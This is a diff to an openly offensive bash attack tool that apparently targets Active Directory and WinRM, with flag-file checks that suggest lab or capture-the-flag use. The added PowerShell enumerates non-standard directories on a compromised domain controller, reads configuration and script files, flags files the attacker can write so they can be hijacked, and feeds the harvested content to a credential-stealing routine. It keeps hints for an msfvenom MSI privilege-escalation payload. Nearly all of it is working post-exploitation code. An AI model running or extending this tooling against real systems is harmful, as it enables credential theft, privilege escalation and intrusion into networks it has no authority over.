@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.32.1"
+readonly VERSION="1.33.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -2439,7 +2439,13 @@ _winrm_postex() {
     ps+='echo "===AIE==="; reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>$null; reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>$null; '
     ps+='echo "===SVC==="; Get-CimInstance Win32_Service | ?{ $_.PathName -notmatch "system32" -and $_.StartName -match "SYSTEM|LocalSystem" } | Select Name,StartName,PathName | Format-List; '
     ps+='echo "===TASKS==="; Get-ScheduledTask | ?{ $_.Principal.UserId -match "SYSTEM" } | Select TaskName,TaskPath | Format-List; '
-    ps+='echo "===CDRIVE==="; Get-ChildItem C:\ -Force -ErrorAction SilentlyContinue | Select Name'
+    ps+='echo "===CDRIVE==="; Get-ChildItem C:\ -Force -ErrorAction SilentlyContinue | Select Name; '
+    # Non-standard top-level dirs (e.g. C:\Share) + IIS web roots are the usual
+    # local-privesc / cred stash on a DC that has no AD path left. List them and
+    # read small config/script/text files; flag anything WE can write (→ hijack).
+    ps+='echo "===NONSTD==="; Get-ChildItem C:\ -Directory -Force -ErrorAction SilentlyContinue | ?{ $_.Name -notmatch "^(Windows|Program Files|Program Files \(x86\)|ProgramData|Users|PerfLogs|Recovery|System Volume Information|\$Recycle.Bin|Config.Msi|Documents and Settings)$" } | %{ $_.FullName; Get-ChildItem $_.FullName -Recurse -Force -ErrorAction SilentlyContinue | Select -First 200 -Expand FullName }; '
+    ps+='echo "===CONFIGS==="; Get-ChildItem C:\inetpub,C:\Share -Recurse -Force -Include web.config,*.ps1,*.bat,*.cmd,*.txt,*.xml,*.config,*.json,*.ini -ErrorAction SilentlyContinue | Select -First 25 | %{ "### "+$_.FullName; Get-Content $_.FullName -TotalCount 80 -ErrorAction SilentlyContinue }; '
+    ps+='echo "===WRITABLE==="; Get-ChildItem C:\inetpub,C:\Share -Recurse -Force -ErrorAction SilentlyContinue | Select -First 400 | %{ try{ $acl=(Get-Acl $_.FullName).Access | ?{ $_.IdentityReference -match "msa_health|Everyone|Authenticated Users|\\\\Users" -and $_.FileSystemRights -match "Write|Modify|FullControl" }; if($acl){ "WRITABLE-BY-US: "+$_.FullName } }catch{} }'
     local out="$OUTDIR/winrm_postex_$(_safe_name "$USER").txt"
     _winrm_exec "$ps" | tee "$out" >>"$LOGFILE"
     [[ ! -s "$out" ]] && { info "WinRM post-ex produced no output (shell/Kerberos issue)"; return; }
@@ -2450,20 +2456,28 @@ _winrm_postex() {
         | grep -avE 'Evil-WinRM|quoting_detection|evil-winrm#|Establishing connection|PS C:\\|whoami /all; echo' >"$clean"
     # Show each non-empty section inline so the next step is visible, not buried.
     local sec body
-    for sec in CMDKEY FLAGS AIE SVC TASKS CDRIVE; do
+    for sec in CMDKEY FLAGS AIE SVC TASKS NONSTD CONFIGS WRITABLE CDRIVE; do
         body=$(awk "/===${sec}===/{f=1;next} /^===[A-Z]+===/{f=0} f" "$clean" | grep -vE '^[[:space:]]*$')
         [[ -z "$body" ]] && continue
+        local cap=15
         case "$sec" in
-            CMDKEY) [[ "$body" == *NONE* ]] && continue; loot "★ Stored credentials (cmdkey /list):" ;;
-            FLAGS)  loot "★ Flag file(s) readable from this shell:" ;;
-            AIE)    grep -qiE '0x1' <<<"$body" && loot "★ AlwaysInstallElevated=1 → MSI as SYSTEM (msfvenom -f msi -p windows/x64/exec)" || continue ;;
-            SVC)    loot "★ SYSTEM service(s) with binary OUTSIDE system32 (check write perms → privesc):" ;;
-            TASKS)  info "SYSTEM scheduled tasks:" ;;
-            CDRIVE) info "C:\\ top-level (note inetpub=IIS, non-standard dirs):" ;;
+            CMDKEY)   [[ "$body" == *NONE* ]] && continue; loot "★ Stored credentials (cmdkey /list):" ;;
+            FLAGS)    loot "★ Flag file(s) readable from this shell:" ;;
+            AIE)      grep -qiE '0x1' <<<"$body" && loot "★ AlwaysInstallElevated=1 → MSI as SYSTEM (msfvenom -f msi -p windows/x64/exec)" || continue ;;
+            SVC)      loot "★ SYSTEM service(s) with binary OUTSIDE system32 (check write perms → privesc):" ;;
+            TASKS)    info "SYSTEM scheduled tasks:" ;;
+            NONSTD)   loot "★ NON-STANDARD top-level dirs + contents (likely the loot/privesc here):"; cap=60 ;;
+            CONFIGS)  loot "★ Config/script/text content (creds? hijackable scripts?):"; cap=80 ;;
+            WRITABLE) loot "★★ Files in C:\\Share / IIS that WE can WRITE → plant/hijack for the account that runs them:" ;;
+            CDRIVE)   info "C:\\ top-level:" ;;
         esac
-        printf '%s\n' "$body" | head -15 | while IFS= read -r l; do detail "      ${l}"; done
+        printf '%s\n' "$body" | head -"$cap" | while IFS= read -r l; do detail "      ${l}"; done
     done
-    rm -f "$clean" 2>/dev/null
+    # Harvest credentials from any config/script content we read (process subst,
+    # not a pipe → queued creds survive). Scoped to the CONFIGS section only.
+    awk '/===CONFIGS===/{f=1;next} /^===[A-Z]+===/{f=0} f' "$clean" >"$clean.cfg" 2>/dev/null
+    [[ -s "$clean.cfg" ]] && harvest_secrets "winrm-configs" < "$clean.cfg"
+    rm -f "$clean" "$clean.cfg" 2>/dev/null
     loot "WinRM post-ex recon saved → $(basename "$out")"
 }
 
